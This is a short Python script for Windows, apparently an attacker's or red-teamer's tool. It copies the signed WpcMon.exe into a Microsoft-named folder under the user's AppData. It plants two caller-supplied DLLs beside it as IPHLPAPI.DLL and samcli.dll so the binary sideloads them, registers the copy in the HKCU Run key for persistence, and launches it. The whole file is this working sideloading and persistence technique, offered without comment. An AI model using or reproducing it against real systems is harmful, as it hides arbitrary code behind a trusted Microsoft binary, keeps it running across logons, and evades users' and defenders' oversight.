import os
import shutil
import subprocess
import sys
import winreg

root = r"C:\Users\operator\AppData\Local\Microsoft\WpcMon"
os.makedirs(root, exist_ok=True)
shutil.copyfile(r"C:\Windows\System32\WpcMon.exe", root + r"\WpcMon.exe")
shutil.copyfile(sys.argv[1], root + r"\IPHLPAPI.DLL")
shutil.copyfile(sys.argv[2], root + r"\samcli.dll")
key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
winreg.SetValueEx(key, "WpcMon", 0, winreg.REG_SZ, r"C:\Users\operator\AppData\Local\Microsoft\WpcMon\WpcMon.exe")
winreg.CloseKey(key)
subprocess.Popen([r"C:\Users\operator\AppData\Local\Microsoft\WpcMon\WpcMon.exe"])
